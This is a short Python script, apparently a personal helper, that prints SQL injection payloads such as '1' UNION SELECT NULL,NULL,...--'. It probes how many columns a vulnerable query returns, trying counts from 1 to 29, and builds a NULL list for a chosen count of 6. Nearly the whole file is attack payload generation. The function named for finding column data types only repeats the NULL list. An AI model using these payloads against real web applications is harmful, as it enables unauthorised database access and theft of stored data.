# Determine Number of Columns using union select
def det_num_col():
        for n in range(1,30):
                base = "1' UNION SELECT ?"
                nulls = ""
                for i in range(0, n):
                        nulls = nulls + "NULL,"
                nulls = nulls[:-1] + "--"
                base = base.replace('?', nulls)
                print(base) 

# Determine Column Data Types
def det_col_type(count):
        base = "1' UNION SELECT ?"
        nulls = ""
        for i in range(0, count):
                nulls = nulls + "NULL,"
        nulls = nulls[:-1] + "--"
        base = base.replace('?', nulls)
        print(base)

#det_num_col()
det_col_type(6)
